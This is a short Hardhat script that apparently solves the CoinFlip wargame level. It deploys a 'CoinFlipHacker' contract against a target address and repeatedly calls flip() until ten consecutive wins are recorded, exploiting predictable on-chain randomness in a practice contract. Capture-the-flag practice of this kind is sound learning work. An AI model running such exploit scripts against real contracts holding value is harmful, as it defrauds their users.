const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const CoinFlip = await ethers.getContractFactory("CoinFlip");
  const coin_flip = await CoinFlip.attach(process.env.COIN_FLIP_ADDR);
  const consecutiveWins = (await coin_flip.consecutiveWins()).toNumber();
  console.log("coin flip consecutiveWins:", consecutiveWins);
  if(consecutiveWins >= 10) {
    return;
  }

  const CoinFlipHacker = await ethers.getContractFactory("CoinFlipHacker");
  const coin_flip_hacker = await CoinFlipHacker.deploy(process.env.COIN_FLIP_ADDR);
  await coin_flip_hacker.deployed();

  for(let i=consecutiveWins; i<10; i++){
    const flipTx = await coin_flip_hacker.flip();
    await flipTx.wait();
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
